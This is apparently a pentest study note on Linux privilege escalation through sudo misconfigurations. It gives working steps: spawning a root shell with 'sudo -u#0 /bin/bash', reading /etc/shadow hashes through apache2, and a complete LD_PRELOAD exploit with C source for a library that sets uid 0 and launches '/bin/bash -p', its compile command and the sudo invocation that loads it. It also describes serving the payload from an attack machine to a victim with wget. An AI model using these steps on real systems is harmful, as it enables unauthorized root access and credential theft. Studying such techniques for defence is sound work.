The `sudo` command allows users to run programs with elevated (root) privileges. In cases where full root access isn't necessary or allowed, system administrators can configure granular sudo privileges for users, allowing them to run specific commands with root privileges while maintaining their regular permission level for the rest of the system.

Any user can check its current situation related to root privileges using this command:

```
sudo -l
```
This will list all the commands the current user is permitted to run with sudo, if any. The sudoers file is typically located at “/etc/sudoers” or “/etc/sudoers.d/”

* If we run this command and see ```/bin/bash``` is runed by anyone as a root we could use this to run it as root:
```
sudo -u#0 /bin/bash
```
* if we have a specific Function like `apache`,  we can get root hash with :
```
sudo apache2 -f /etc/shadow
```
Then we can extract the hashes then use ```su```


**Environment Variables ( LD_PRELOAD )**

Environment Variable: A container that stores important system-wide data needed for tasks. It sets up the environment for the system to work.

Shared Library: Reusable code that can be loaded into memory by a program when it starts. There are two types: static (fixed when the program is created) and shared (loaded dynamically).

LD_PRELOAD: Is an optional Environment Variable that is used to set/load Shared Libraries to a program or script. That means we can set the value of the LD_PRELOAD Environment Variable for a program to tell the program to load the mentioned libraries in it’s memory before starting..


> we are going to make malicious library run before any other libraries.

**STEPS to exploit this**

1. Execute sudo -l to see if we have limited SUDO access to any programs or scripts. For example, if we have a file ```/otp/cleanup.sh``` running with root access without password, we will exploit this as follow.
2. Enumerate to see if we have permission to set the environment variable for the script or program. In this case we see that we can ```SETENV``` which means the same. Also see if the ```env_keep += LD_PRELOAD``` is set here or in the sudoers file. 
 
![Screenshot from 2024-09-29 00-42-22](https://github.com/user-attachments/assets/b83d3699-fe1a-4f6c-abb0-44090406af44)
![Screenshot from 2024-09-29 00-54-16](https://github.com/user-attachments/assets/219ce0c7-6e11-4dcd-bf18-b0f4fb1f42ab)


3. Write and compile a malicious binary that will give us a root shell. We can write and compile it in the victim machine if gcc and ```vim/nano``` is present there. Or we can write and compile the code in our Attack Machine and then use ```python3 -m http.server 80``` to host the file and wget it in the Victim Machine.
4. creat our script ```exploit.c```:
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	}
```
5. compile it:
```
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```
6. Now it’s time to load our malicious shared library into the memory:
```
sudo LD_PRELOAD=<location_to_our_shared_library> <location_to_the_script/program>
```
ex
```
sudo LD_PRELOAD=/tmp/exploit.so /opt/cleanup.sh
#OR
sudo LD_PRELOAD=/tmp/exploit.so find
```
now, we have root access.















Finally, we can use this [GTFOBins](https://gtfobins.github.io/?source=post_page-----3fb61a09f7ba--------------------------------)



















